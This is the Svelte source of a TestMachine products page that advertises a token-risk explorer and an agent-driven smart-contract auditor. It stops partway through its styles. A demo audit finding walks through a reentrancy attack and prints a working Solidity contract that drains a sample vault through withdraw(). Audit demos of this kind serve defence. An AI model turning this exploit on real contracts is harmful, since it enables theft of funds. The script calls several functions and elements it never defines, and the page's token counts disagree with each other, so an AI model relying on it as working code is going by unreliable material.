<script lang="ts">
  import { onMount, onDestroy } from 'svelte';

  // ========================================
  // TOKEN EXPLORER DATA & STATE
  // ========================================
  const teTokens = [
    {
      name: 'JUDEX', sub: 'JudexAI', chain: 'Base', contract: 'ClankerToken',
      block: '42,333,363', verified: true, score: -100, riskLabel: 'CRITICAL RISK',
      factors: [
        [-100, 'crit', 'Confiscation', 'Can reduce or remove token balances from specific accounts'],
        [-20, 'warn', 'Minting', 'New tokens can be created, increasing total supply'],
        [-20, 'warn', 'Assembly', 'Contains low-level assembly code'],
        [0, 'info', 'Management', 'Admin functions for role management']
      ],
      behaviors: [
        ['red', 'Confiscation', 'crosschainBurn(address,uint256)', '0x4200...0028'],
        ['yellow', 'Management', 'updateAdmin(address)', '0x1391...E492'],
        ['green', 'Minting', 'crosschainMint(address,uint256)', '0x4200...0028'],
        ['blue', 'Assembly', '26 variants \u2014 escapeJSON, getAddressSlot, _unsafeReadBytesOffset...', '']
      ]
    },
    {
      name: 'WILDE', sub: 'Lobstar Wilde', chain: 'Base', contract: 'ERC20Token',
      block: '41,892,110', verified: true, score: -80, riskLabel: 'HIGH RISK',
      factors: [
        [-80, 'crit', 'Confiscation', 'Owner can force-transfer tokens between arbitrary accounts'],
        [-15, 'warn', 'Minting', 'Unlimited minting capability via owner-only function'],
        [-15, 'warn', 'Assembly', 'Contains inline assembly in transfer logic']
      ],
      behaviors: [
        ['red', 'Confiscation', 'forceTransfer(address,address,uint256)', '0x8b2f...a901'],
        ['green', 'Minting', 'mint(address,uint256)', '0x8b2f...a901'],
        ['blue', 'Assembly', '12 variants \u2014 transferFrom, _transfer, _approve...', '']
      ]
    },
    {
      name: 'WETH', sub: 'Wrapped Ether', chain: 'Ethereum', contract: 'WETH9',
      block: '19,456,002', verified: true, score: 95, riskLabel: 'SAFE',
      factors: [
        [0, 'safe', 'No risky behaviors', 'Standard WETH implementation with no admin controls']
      ],
      behaviors: []
    },
    {
      name: 'AAVE', sub: 'Aave Token', chain: 'Ethereum', contract: 'AaveTokenV3',
      block: '18,892,340', verified: true, score: 72, riskLabel: 'LOW RISK',
      factors: [
        [-15, 'warn', 'Governance', 'Token holders can delegate voting power and propose changes'],
        [-8, 'warn', 'Pausable', 'Emergency pause function controlled by guardian multisig']
      ],
      behaviors: [
        ['yellow', 'Governance', 'propose(address[],uint256[],bytes[])', '0x7d2b...c301'],
        ['purple', 'Pausable', 'pause()', '0x2af3...9e12']
      ]
    },
    {
      name: 'PEPE', sub: 'PepeCoin', chain: 'Ethereum', contract: 'PepeToken',
      block: '17,046,105', verified: true, score: -45, riskLabel: 'MEDIUM RISK',
      factors: [
        [-25, 'warn', 'Minting', 'Owner can mint additional tokens beyond initial supply'],
        [-10, 'med', 'Management', 'Owner can change fee parameters and recipient addresses'],
        [-10, 'med', 'Assembly', 'Low-level assembly used in token transfer functions']
      ],
      behaviors: [
        ['green', 'Minting', 'mint(address,uint256)', '0x6982...f234'],
        ['yellow', 'Management', 'setOwner(address)', '0x6982...f234'],
        ['blue', 'Assembly', '5 variants \u2014 _transfer, approve, transferFrom...', '']
      ]
    },
    {
      name: 'GEM', sub: 'GemToken', chain: 'Arbitrum', contract: 'TransparentProxy',
      block: '178,234,501', verified: false, score: -90, riskLabel: 'CRITICAL RISK',
      factors: [
        [-90, 'crit', 'Confiscation', 'Admin can burn tokens from any address without approval'],
        [-20, 'warn', 'Minting', 'Unlimited minting through owner-only function'],
        [-15, 'warn', 'Proxy', 'Upgradeable proxy \u2014 implementation can be changed by admin']
      ],
      behaviors: [
        ['red', 'Confiscation', 'burn(address,uint256)', '0x3e8a...7f01'],
        ['green', 'Minting', 'mint(address,uint256)', '0x3e8a...7f01'],
        ['purple', 'Proxy', 'upgradeTo(address)', '0x3e8a...7f01']
      ]
    }
  ];

  let teCurrentIdx = $state(0);
  let teDetail: HTMLDivElement | undefined = $state();
  let teFrame: HTMLDivElement | undefined = $state();
  let azFrame: HTMLDivElement | undefined = $state();
  let teAutoTimer: ReturnType<typeof setInterval> | undefined;
  let teObserver: IntersectionObserver | undefined;
  let azObserver: IntersectionObserver | undefined;

  // Azimuth stat elements
  let pdAzInvest: HTMLDivElement | undefined = $state();
  let pdAzConfirm: HTMLDivElement | undefined = $state();
  let pdAzFP: HTMLDivElement | undefined = $state();
  // Azimuth counter animation
  function azCounter(el: HTMLElement, target: number, dur: number = 600) {
    const t0 = performance.now();
    (function tick(now: number) {
      const p = Math.min((now - t0) / dur, 1);
      const eased = 1 - Math.pow(1 - p, 3);
      el.textContent = String(Math.round(target * eased));
      if (p < 1) requestAnimationFrame(tick);
      else el.textContent = String(target);
    })(t0);
  }

  onMount(() => {
    // Initialize first token detail
    teRender(0);

    // Token Explorer auto-cycle via IntersectionObserver
    if (teFrame) {
      teObserver = new IntersectionObserver(function(entries) {
        if (entries[0].isIntersecting) {
          teStartAuto();
        } else {
          clearInterval(teAutoTimer);
        }
      }, { threshold: 0.15 });
      teObserver.observe(teFrame);
    }

    // Scale stats count-up animation (stats-number elements)
    const statNumbers = document.querySelectorAll('.stats-number[data-value]');
    function animateCountUp(el: HTMLElement) {
      const target = parseFloat(el.getAttribute('data-value') || '0');
      const prefix = el.getAttribute('data-prefix') || '';
      const suffix = el.getAttribute('data-suffix') || '';
      const duration = 2000;
      let start: number | null = null;
      const decimals = target % 1 === 0 ? 0 : 1;

      function update(timestamp: number) {
        if (!start) start = timestamp;
        const elapsed = timestamp - start;
        const progress = Math.min(elapsed / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3);
        const current = target * eased;
        el.textContent = prefix + Number(current.toFixed(decimals)).toLocaleString() + suffix;
        if (progress < 1) {
          requestAnimationFrame(update);
        } else {
          el.textContent = prefix + Number(target.toFixed(decimals)).toLocaleString() + suffix;
        }
      }
      requestAnimationFrame(update);
    }

    if (statNumbers.length > 0) {
      const statsObserver = new IntersectionObserver(
        (entries) => {
          entries.forEach((entry) => {
            if (entry.isIntersecting) {
              animateCountUp(entry.target as HTMLElement);
              statsObserver.unobserve(entry.target);
            }
          });
        },
        { threshold: 0.3 }
      );
      statNumbers.forEach((el) => statsObserver.observe(el));
    }

    // Azimuth stats animation
    let azAnimated = false;
    if (azFrame) {
      azObserver = new IntersectionObserver(function(entries) {
        if (entries[0].isIntersecting && !azAnimated) {
          azAnimated = true;

          setTimeout(function() {
            if (pdAzInvest) azCounter(pdAzInvest, 2);
          }, 300);
          setTimeout(function() {
            if (pdAzConfirm) azCounter(pdAzConfirm, 2);
          }, 500);
          setTimeout(function() {
            if (pdAzFP) pdAzFP.textContent = '0';
          }, 700);
          setTimeout(function() {
            // Azimuth time display uses trusted static content only
            if (pdAzTime) pdAzTime.innerHTML = '12.6<span style="font-size:0.75rem;color:oklch(0.5 0 0)">m</span>';
          }, 900);
          setTimeout(function() {
            if (pdAzSignal) pdAzSignal.style.opacity = '1';
          }, 1100);
        }
      }, { threshold: 0.15 });
      azObserver.observe(azFrame);
    }
  });

  onDestroy(() => {
    clearInterval(teAutoTimer);
    teObserver?.disconnect();
    azObserver?.disconnect();
  });
</script>

<svelte:head>
  <title>Azimuth — TestMachine</title>
  <meta name="description" content="Azimuth - Deep security analysis powered by machine learning. Advanced threat detection and vulnerability assessment." />
  <meta name="keywords" content="Web3 security, token risk scoring, smart contract audit, blockchain security, AI security, DeFi security, token explorer, azimuth" />
</svelte:head>


<!-- =========================================================
     SECTION 1: Hero
     ========================================================= -->
<section class="pd-hero">
  <div class="container">
    <span class="pd-hero-tag">Products</span>
    <h1 class="pd-hero-title">Your Security Stack</h1>
    <p class="pd-hero-sub">Two products. <strong>Zero false positives.</strong> From token risk scoring to deep protocol analysis &mdash; everything you need to secure your on-chain exposure.</p>
  </div>
</section>


<!-- =========================================================
     SECTION 2: Scale Stats
     ========================================================= -->
<section class="pd-scale" id="scale">
  <div class="container">
    <div class="pd-scale-grid" data-animate>
      <div class="pd-scale-card">
        <div class="pd-scale-num stats-number" data-value="8.1" data-suffix="M+">0M+</div>
        <div class="pd-scale-label">Tokens analyzed</div>
      </div>
      <div class="pd-scale-card">
        <div class="pd-scale-num stats-number" data-value="7">0</div>
        <div class="pd-scale-label">EVM chains</div>
      </div>
      <div class="pd-scale-card">
        <div class="pd-scale-num" style="color: #22c55e;">0</div>
        <div class="pd-scale-label">False positives</div>
      </div>
      <div class="pd-scale-card">
        <div class="pd-scale-num">24/7</div>
        <div class="pd-scale-label">Continuous analysis</div>
      </div>
    </div>
  </div>
</section>


<!-- =========================================================
     SECTION 3: Token Explorer
     ========================================================= -->
<section class="pd-section" id="token-explorer">
  <div class="container">
    <div class="pd-section-header" data-animate>
      <span class="section-label">Product 01</span>
      <h2 class="pd-section-title">Token Explorer</h2>
      <p class="pd-section-desc">Risk scoring for 9M+ tokens across every EVM chain. Autonomous AI agents probe every function of every contract, classifying behaviors and producing risk scores from &minus;100 (critical danger) to +100 (safe). Continuously re-tested as contracts change.</p>
      <div class="pd-section-features">
        <span class="pd-feature">8.1M+ tokens</span>
        <span class="pd-feature">7 EVM chains</span>
        <span class="pd-feature">Real-time scores</span>
        <span class="pd-feature">Behavior classification</span>
        <span class="pd-feature">Continuous re-testing</span>
      </div>
    </div>

    <div class="pd-frame" data-animate bind:this={teFrame}>
      <!-- Titlebar -->
      <div class="pd-titlebar">
        <div class="pd-titlebar-left">
          <div class="pd-titlebar-dots">
            <span style="background:#ef4444"></span>
            <span style="background:#f59e0b"></span>
            <span style="background:#22c55e"></span>
          </div>
          <div class="pd-titlebar-url"><span class="pd-domain">app.testmachine.ai</span>/token-explorer</div>
        </div>
      </div>

      <!-- Explorer Header -->
      <div class="pd-te-header">
        <div class="pd-te-title">Token Explorer</div>
        <div class="pd-te-live"><span class="pd-te-live-dot"></span> Live</div>
      </div>

      <!-- Stats -->
      <div class="pd-te-stats">
        <div>
          <span class="pd-te-stat-num">8,101,870</span>
          <span class="pd-te-stat-label">tokens analyzed</span>
        </div>
        <div>
          <span class="pd-te-stat-num">2,379,208</span>
          <span class="pd-te-stat-label">behaviors surfaced</span>
        </div>
        <div>
          <span class="pd-te-stat-num">7</span>
          <span class="pd-te-stat-label">chains covered</span>
        </div>
      </div>

      <!-- Token Table -->
      <table class="pd-te-table">
        <thead>
          <tr>
            <th style="width:22%">Token</th>
            <th style="width:12%">Network</th>
            <th style="width:42%">Behaviors</th>
            <th style="width:12%">Risk Score</th>
          </tr>
        </thead>
        <tbody>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 0} onclick={() => handleRowClick(0)}>
            <td><span class="pd-te-tok-name">JUDEX</span><span class="pd-te-tok-sub">JudexAI</span></td>
            <td><span class="pd-chain pd-chain-base">Base</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-red">Confiscation</span><span class="pd-badge pd-badge-yellow">Governance</span><span class="pd-badge pd-badge-blue">Assembly</span><span class="pd-te-dim">+2</span></div></td>
            <td><span class="pd-risk-crit">-100</span></td>
          </tr>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 1} onclick={() => handleRowClick(1)}>
            <td><span class="pd-te-tok-name">WILDE</span><span class="pd-te-tok-sub">Lobstar Wilde</span></td>
            <td><span class="pd-chain pd-chain-base">Base</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-red">Confiscation</span><span class="pd-badge pd-badge-green">Minting</span><span class="pd-badge pd-badge-blue">Assembly</span></div></td>
            <td><span class="pd-risk-high">-80</span></td>
          </tr>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 2} onclick={() => handleRowClick(2)}>
            <td><span class="pd-te-tok-name">WETH</span><span class="pd-te-tok-sub">Wrapped Ether</span></td>
            <td><span class="pd-chain pd-chain-eth">Ethereum</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-none">None detected</span></div></td>
            <td><span class="pd-risk-safe">+95</span></td>
          </tr>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 3} onclick={() => handleRowClick(3)}>
            <td><span class="pd-te-tok-name">AAVE</span><span class="pd-te-tok-sub">Aave Token</span></td>
            <td><span class="pd-chain pd-chain-eth">Ethereum</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-yellow">Governance</span><span class="pd-badge pd-badge-purple">Pausable</span></div></td>
            <td><span class="pd-risk-low">+72</span></td>
          </tr>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 4} onclick={() => handleRowClick(4)}>
            <td><span class="pd-te-tok-name">PEPE</span><span class="pd-te-tok-sub">PepeCoin</span></td>
            <td><span class="pd-chain pd-chain-eth">Ethereum</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-green">Minting</span><span class="pd-badge pd-badge-yellow">Management</span><span class="pd-badge pd-badge-blue">Assembly</span></div></td>
            <td><span class="pd-risk-med">-45</span></td>
          </tr>
          <tr class="pd-te-row" class:pd-te-selected={teCurrentIdx === 5} onclick={() => handleRowClick(5)}>
            <td><span class="pd-te-tok-name">GEM</span><span class="pd-te-tok-sub">GemToken</span></td>
            <td><span class="pd-chain pd-chain-arb">Arbitrum</span></td>
            <td><div class="pd-te-behavs"><span class="pd-badge pd-badge-red">Confiscation</span><span class="pd-badge pd-badge-green">Minting</span><span class="pd-badge pd-badge-purple">Proxy</span></div></td>
            <td><span class="pd-risk-crit">-90</span></td>
          </tr>
        </tbody>
      </table>

      <!-- Detail Panel (populated by JS) -->
      <div class="pd-te-detail" bind:this={teDetail}></div>
    </div>

    <div class="pd-section-action" data-animate>
      <a href="https://app.testmachine.ai/token-explorer" class="btn btn--secondary">Explore Tokens &rarr;</a>
    </div>
  </div>
</section>


<!-- =========================================================
     SECTION 4: Azimuth - Deep Security Analysis
     ========================================================= -->
<section class="pd-section" id="azimuth-product">
  <div class="container">
    <div class="pd-section-header" data-animate>
      <span class="section-label">Product 02</span>
      <h2 class="pd-section-title">Azimuth &mdash; Deep Security Analysis</h2>
      <p class="pd-section-desc">The RL-powered security engine for protocols and smart contracts. Agents attack your code in sandboxed forked environments. Every finding comes with a working proof-of-concept exploit. If it's reported, it was actually exploited.</p>
      <div class="pd-section-features">
        <span class="pd-feature">RL-powered agents</span>
        <span class="pd-feature">Zero false positives</span>
        <span class="pd-feature">Working PoC for every finding</span>
        <span class="pd-feature">CI/CD integration</span>
      </div>
    </div>

    <div class="pd-frame" data-animate bind:this={azFrame}>
      <!-- Titlebar -->
      <div class="pd-titlebar">
        <div class="pd-titlebar-left">
          <div class="pd-titlebar-dots">
            <span style="background:#ef4444"></span>
            <span style="background:#f59e0b"></span>
            <span style="background:#22c55e"></span>
          </div>
          <div class="pd-titlebar-url"><span class="pd-domain">app.testmachine.ai</span>/azimuth/report/primevault</div>
        </div>
      </div>

      <!-- Report Header -->
      <div class="pd-az-header">
        <div class="pd-az-title">Security Analysis &mdash; testmachine-ai/PrimeVault</div>
        <div class="pd-az-badge pd-az-badge-done">&#10003; Completed</div>
      </div>

      <!-- Stats -->
      <div class="pd-az-stats">
        <div class="pd-az-stat">
          <div class="pd-az-stat-label">Investigated</div>
          <div class="pd-az-stat-val" bind:this={pdAzInvest}>0</div>
        </div>
        <div class="pd-az-stat">
          <div class="pd-az-stat-label">Confirmed</div>
          <div class="pd-az-stat-val pd-az-val-green" bind:this={pdAzConfirm}>0</div>
        </div>
        <div class="pd-az-stat">
          <div class="pd-az-stat-label">False Positives</div>
          <div class="pd-az-stat-val pd-az-val-emerald" bind:this={pdAzFP}>0</div>
        </div>
        <div class="pd-az-stat">
          <div class="pd-az-stat-label">Analysis Time</div>
          <div class="pd-az-stat-val" bind:this={pdAzTime}><span style="font-size:0.75rem;color:oklch(0.5 0 0)">&mdash;</span></div>
        </div>
      </div>

      <!-- Signal Row -->
      <div class="pd-az-signal" bind:this={pdAzSignal} style="opacity:0; transition: opacity 0.4s;">
        <div class="pd-az-signal-badge"><span class="pd-az-signal-dot"></span> 100% signal &middot; 0 false positives</div>
        <div class="pd-az-cost">4.8M tokens &middot; <span class="pd-az-cost-val">$0.05</span> total cost</div>
      </div>

      <!-- Findings -->
      <div class="pd-az-findings">
        <div class="pd-az-findings-head" data-animate>
          Findings
          <span class="pd-sev pd-sev-critical">Critical 1</span>
          <span class="pd-sev pd-sev-low">Low 1</span>
        </div>

        <!-- Finding 1: Critical -->
        <div class="pd-az-finding" data-animate style="transition-delay: 0.15s">
          <div class="pd-az-finding-header">
            <div style="display:flex;align-items:center;gap:8px">
              <span class="pd-sev pd-sev-critical">Critical</span>
              <span class="pd-az-finding-title">Reentrancy in withdraw() enables fund drainage</span>
            </div>
            <span class="pd-az-confirmed">&#10003; Confirmed</span>
          </div>
          <div class="pd-az-finding-desc">The <code style="color:var(--accent)">withdraw()</code> function sends ETH to the caller before updating internal accounting state. An attacker can deploy a malicious contract that re-enters <code style="color:var(--accent)">withdraw()</code> during the ETH transfer, draining the vault in a single transaction.</div>

          <div class="pd-az-steps-title">Attack Sequence</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.3s"><span class="pd-az-step-num">1</span> Attacker deposits minimum stake into PrimeVault</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.4s"><span class="pd-az-step-num">2</span> Attacker calls withdraw() from malicious contract</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.5s"><span class="pd-az-step-num">3</span> PrimeVault sends ETH via call&#123;value:&#125;</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.6s"><span class="pd-az-step-num">4</span> Attacker's receive() re-enters withdraw()</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.7s"><span class="pd-az-step-num">5</span> State not yet updated &mdash; full balance available again</div>
          <div class="pd-az-step" data-animate style="transition-delay: 0.8s"><span class="pd-az-step-num">6</span> Loop repeats until vault is drained</div>

          <div class="pd-code-label" data-animate style="transition-delay: 0.9s">Proof of Concept</div>
          <div class="pd-code" data-animate style="transition-delay: 1.0s">
<code><span class="cm">// SPDX-License-Identifier: MIT</span>
<span class="kw">pragma solidity</span> <span class="str">^0.8.19</span>;

<span class="kw">import</span> <span class="str">"./PrimeVault.sol"</span>;

<span class="kw">contract</span> <span class="type">ReentrancyExploit</span> &#123;
    <span class="type">PrimeVault</span> <span class="kw">public</span> vault;
    <span class="type">uint256</span> <span class="kw">public</span> attackCount;

    <span class="kw">constructor</span>(<span class="type">address</span> _vault) &#123;
        vault = <span class="type">PrimeVault</span>(_vault);
    &#125;

    <span class="kw">function</span> <span class="fn">attack</span>() <span class="kw">external payable</span> &#123;
        vault.deposit&#123;<span class="kw">value</span>: msg.value&#125;();
        vault.withdraw();
    &#125;

    <span class="kw">receive</span>() <span class="kw">external payable</span> &#123;
        <span class="kw">if</span> (attackCount &lt; <span class="num">10</span>) &#123;
            attackCount++;
            vault.withdraw();
        &#125;
    &#125;
&#125;</code>
          </div>
        </div>

        <!-- Finding 2: Low -->
        <div class="pd-az-finding" data-animate style="transition-delay: 0.2s">
          <div class="pd-az-finding-header">
            <div style="display:flex;align-items:center;gap:8px">
              <span class="pd-sev pd-sev-low">Low</span>
              <span class="pd-az-finding-title">Arithmetic overflow in pendingReward calculation</span>
            </div>
            <span class="pd-az-confirmed">&#10003; Confirmed</span>
          </div>
          <div class="pd-az-finding-desc">The <code style="color:var(--accent)">pendingReward()</code> function can overflow when computing accumulated rewards for accounts with very large staking durations combined with high reward rates. Results in denial of service for affected accounts &mdash; rewards become unclaimable.</div>
        </div>
      </div>
    </div>

    <div class="pd-section-action" data-animate>
      <a href="https://app.testmachine.ai/" class="btn btn--secondary">Run Azimuth Analysis &rarr;</a>
    </div>
  </div>
</section>


<!-- =========================================================
     SECTION 6: All EVM Chains
     ========================================================= -->
<section class="pd-section" id="chains">
  <div class="container">
    <div class="pd-section-header" data-animate>
      <span class="section-label">Coverage</span>
      <h2 class="pd-section-title">Every major EVM chain</h2>
      <p class="pd-section-desc">One engine. Full coverage. Every chain analyzed with the same depth and rigor.</p>
    </div>
    <div class="pd-chains-grid" data-animate>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 417" xmlns="http://www.w3.org/2000/svg"><path fill="#627EEA" d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z"/><path fill="#627EEA" opacity=".6" d="M127.962 0L0 212.32l127.962 75.639V154.158z"/><path fill="#627EEA" d="M127.961 312.187l-1.575 1.92V414.2l1.575 4.6L256 236.587z"/><path fill="#627EEA" opacity=".6" d="M127.962 418.8v-106.61L0 236.585z"/></svg></div>
        <div class="pd-chain-name">Ethereum</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 111 111" xmlns="http://www.w3.org/2000/svg"><circle cx="55.5" cy="55.5" r="55.5" fill="#0052FF"/><path d="M55.5 22C37 22 22 37 22 55.5S37 89 55.5 89c15.2 0 28-10.1 32.2-24H72.8c-3.5 8-11.4 13.5-17.3 13.5C45.2 78.5 36 69.3 36 55.5S45.2 32.5 55.5 32.5c5.9 0 13.8 5.5 17.3 13.5h14.9C83.5 32.1 70.7 22 55.5 22z" fill="#fff"/></svg></div>
        <div class="pd-chain-name">Base</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg"><path d="M151.818 141.296L128.065 177.888 104.193 141.296 128.065 0z" fill="#28A0F0"/><path d="M128.065 189.888L104.193 153.296 128.065 256 151.818 153.296z" fill="#28A0F0"/><path d="M128.065 0L40 141.296 128.065 189.888 216.13 141.296z" fill="#28A0F0" opacity=".6"/></svg></div>
        <div class="pd-chain-name">Arbitrum</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg"><circle cx="128" cy="128" r="128" fill="#FF0420"/><path d="M81.4 170.4c-4.8 0-7.6-3.2-6.4-8l22-94.4c1.6-6 7.6-10 13.6-10h38.8c20 0 33.2 12.4 30 30-2 10.8-8.4 19.6-16.8 25.2 6 4 9.2 11.2 7.6 20.4-2.8 16.4-16.8 28.8-34 28.8H81.4zm43.6-14c8.4 0 14.4-6 15.6-13.2 1.2-7.2-3.2-12.8-11.6-12.8h-18l-5.6 26h19.6zm4.8-42c7.6 0 13.2-5.2 14.4-12 1.2-6.4-2.8-11.6-10.4-11.6h-16.4l-5.2 23.6h17.6z" fill="#fff"/></svg></div>
        <div class="pd-chain-name">Optimism</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg"><path d="M128 0L233.6 60.8v121.6L128 256 22.4 182.4V60.8z" fill="#8247E5"/><path d="M170.4 101.6c-3.2-1.6-7.2-1.6-10.4 0l-24 14.4-16.4 9.2-24 14.4c-3.2 1.6-7.2 1.6-10.4 0l-18.8-11.2c-3.2-1.6-5.2-5.2-5.2-8.8v-21.6c0-3.6 2-7.2 5.2-8.8l18.8-10.8c3.2-1.6 7.2-1.6 10.4 0l18.8 10.8c3.2 1.6 5.2 5.2 5.2 8.8v14.4l16.4-9.6v-14.4c0-3.6-2-7.2-5.2-8.8l-35.2-20.4c-3.2-1.6-7.2-1.6-10.4 0l-36 20.8c-3.2 1.6-5.2 5.2-5.2 8.8v41.2c0 3.6 2 7.2 5.2 8.8l35.6 20.4c3.2 1.6 7.2 1.6 10.4 0l24-13.6 16.4-9.6 24-13.6c3.2-1.6 7.2-1.6 10.4 0l18.8 10.8c3.2 1.6 5.2 5.2 5.2 8.8v21.6c0 3.6-2 7.2-5.2 8.8l-18.4 11.2c-3.2 1.6-7.2 1.6-10.4 0l-18.8-10.8c-3.2-1.6-5.2-5.2-5.2-8.8v-14.4l-16.4 9.6v14.4c0 3.6 2 7.2 5.2 8.8l35.6 20.4c3.2 1.6 7.2 1.6 10.4 0l35.6-20.4c3.2-1.6 5.2-5.2 5.2-8.8v-41.2c0-3.6-2-7.2-5.2-8.8z" fill="#fff"/></svg></div>
        <div class="pd-chain-name">Polygon</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg"><circle cx="128" cy="128" r="128" fill="#E84142"/><path d="M171.8 130.8c4.4-2.4 4.4-8.4 0-10.8L135.6 98c-4.4-2.4-9.6.8-9.6 5.6v43.6c0 4.8 5.2 8 9.6 5.6l36.2-22zm-52.4 30.4c4.4 2.4 9.6-.8 9.6-5.6V112c0-4.8-5.2-8-9.6-5.6l-36.2 22c-4.4 2.4-4.4 8.4 0 10.8l36.2 22z" fill="#fff"/></svg></div>
        <div class="pd-chain-name">Avalanche</div>
      </div>
      <div class="pd-chain-card">
        <div class="pd-chain-icon"><svg viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg"><circle cx="128" cy="128" r="128" fill="#F3BA2F"/><path d="M128 60l30 30-30 30-30-30zm50 50l30 30-30 30-30-30zm-100 0l30 30-30 30-30-30zm50 50l30 30-30 30-30-30z" fill="#fff"/></svg></div>
        <div class="pd-chain-name">BNB Chain</div>
      </div>
    </div>
  </div>
</section>


<!-- =========================================================
     SECTION 7: CTA
     ========================================================= -->
<section class="pd-cta" id="cta">
  <div class="container" data-animate>
    <h2 class="pd-cta-title">Start securing your protocol</h2>
    <p class="pd-cta-sub">Explore 9M+ tokens. Run deep security analysis. Zero false positives. All in one platform.</p>
    <a href="https://app.testmachine.ai/" class="btn btn--primary">Launch App</a>
  </div>
</section>


<style>
  /* ========== Products Page Styles ========== */

  /* -- Hero -- */
  .pd-hero {
    padding: calc(var(--nav-h) + 100px) 0 80px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  .pd-hero::before {
    content: '';
    position: absolute;
    inset: 0;
    background:
      radial-gradient(ellipse 80% 50% at 50% -10%, oklch(0.25 0.04 192 / 0.35) 0%, transparent 70%),
      radial-gradient(ellipse 40% 40% at 75% 40%, oklch(0.22 0.02 220 / 0.2) 0%, transparent 60%),
      radial-gradient(ellipse 40% 40% at 25% 60%, oklch(0.20 0.02 280 / 0.15) 0%, transparent 60%);
    pointer-events: none;
  }
  @keyframes heroFadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
  .pd-hero-tag {
    display: inline-block;
    font-family: var(--font-mono);
    font-size: 0.75rem;
    font-weight: 500;
    text-transform: uppercase;
    letter-spacing: 0.15em;
    color: var(--accent);
    margin-bottom: 1.5rem;
    animation: heroFadeIn 0.8s ease 0.2s both;
  }
  .pd-hero-title {
    font-family: var(--font-display);
    font-size: clamp(2.75rem, 7vw, 4.5rem);
    font-weight: 800;
    line-height: 1.06;
    letter-spacing: -0.035em;
    margin-bottom: 1.5rem;
    color: var(--fg);
    animation: heroFadeIn 0.8s ease 0.4s both;
  }
  .pd-hero-sub {
    font-size: clamp(0.9375rem, 2vw, 1.125rem);
    color: var(--fg-muted);
    max-width: 680px;
    margin: 0 auto;
    line-height: 1.7;
    animation: heroFadeIn 0.8s ease 0.6s both;
  }
  .pd-hero-sub strong {
    color: var(--accent);
    font-weight: 600;
  }

  /* -- Scale Stats -- */
  .pd-scale {
    padding: var(--section-py) 0;
    border-top: 1px solid var(--border-subtle);
  }
  .pd-scale-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: var(--gap);
  }
  .pd-scale-card {
    text-align: center;
    padding: 28px 16px;
    background: var(--card-bg);
    border: 1px solid var(--border-subtle);
  }
  .pd-scale-num {
    font-family: var(--font-mono);
    font-size: clamp(1.5rem, 3vw, 2rem);
    font-weight: 700;
    color: var(--accent);
    font-variant-numeric: tabular-nums;
    line-height: 1.2;
    margin-bottom: 6px;
  }
  .pd-scale-label {
    font-size: 0.75rem;
    color: var(--fg-muted);
  }

  /* -- Section Shared -- */
  .pd-section {
    padding: var(--section-py) 0;
    border-top: 1px solid var(--border-subtle);
  }
  .pd-section-header {
    margin-bottom: 2.5rem;
  }
  .pd-section-title {
    font-family: var(--font-display);
    font-size: clamp(1.75rem, 3.5vw, 2.5rem);
    font-weight: 700;
    line-height: 1.12;
    letter-spacing: -0.025em;
    margin-bottom: 0.75rem;
    color: var(--fg);
  }
  .pd-section-desc {
    font-family: var(--font-body);
    color: var(--fg-muted);
    max-width: 640px;
    font-size: 0.9375rem;
    line-height: 1.7;
  }
  .pd-section-features {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-top: 1.25rem;
  }
  .pd-feature {
    font-family: var(--font-mono);
    font-size: 0.6875rem;
    font-weight: 500;
    padding: 4px 12px;
    background: oklch(0.22 0.005 260);
    border: 1px solid var(--border-subtle);
    color: var(--fg-muted);
  }
  :global([data-theme="light"]) .pd-feature {
    background: oklch(0.92 0.003 260);
  }
  .pd-section-action {
    margin-top: 2rem;
  }

  /* -- Mock Frame Shared -- */
  .pd-frame {
    background: oklch(0.13 0.005 260);
    border: 1px solid oklch(0.25 0.005 260);
    overflow: hidden;
    font-family: var(--font-mono);
    font-size: 0.8125rem;
    line-height: 1.5;
  }
  :global([data-theme="light"]) .pd-frame {
    background: oklch(0.97 0 0);
    border-color: oklch(0.85 0 0);
  }
  .pd-titlebar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 20px;
    background: oklch(0.16 0.005 260);
    border-bottom: 1px solid oklch(0.22 0 0);
    font-family: var(--font-mono);
    font-size: 0.75rem;
  }
  :global([data-theme="light"]) .pd-titlebar {
    background: oklch(0.94 0 0);
    border-color: oklch(0.85 0 0);
  }
  .pd-titlebar-left {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .pd-titlebar-dots {
    display: flex;
    gap: 6px;
  }
  .pd-titlebar-dots span {
    width: 10px;
    height: 10px;
    border-radius: 50%;
  }
